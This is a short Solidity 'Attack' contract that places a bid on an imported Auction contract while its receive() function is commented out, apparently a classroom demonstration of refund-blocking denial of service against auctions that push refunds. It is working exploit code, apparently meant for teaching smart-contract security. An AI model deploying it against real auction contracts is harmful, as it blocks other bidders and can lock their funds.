//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Auction.sol";

contract Attack {
    Auction auctionContract;

    constructor(address _auctionContract) {
        auctionContract = Auction(_auctionContract);
    }

    function attack() public payable {
        auctionContract.bid{value: msg.value}();
    }

    // receive() external payable {}
}
